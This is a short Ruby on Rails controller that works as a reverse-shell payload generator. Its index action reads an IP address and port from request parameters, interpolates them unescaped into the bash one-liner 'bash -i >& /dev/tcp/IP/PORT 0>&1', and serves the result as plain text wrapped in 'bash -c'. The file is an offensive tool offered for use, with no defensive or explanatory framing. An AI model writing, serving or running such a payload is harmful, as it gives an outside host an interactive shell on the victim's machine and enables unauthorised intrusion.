class RvshController < ApplicationController
  def index
    ip, port = revshell_params.values_at(:ip, :port)
    revshell = "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1"
    render plain: "bash -c '#{revshell}'"
  end

  def revshell_params
    params.permit(:ip, :port)
  end
end
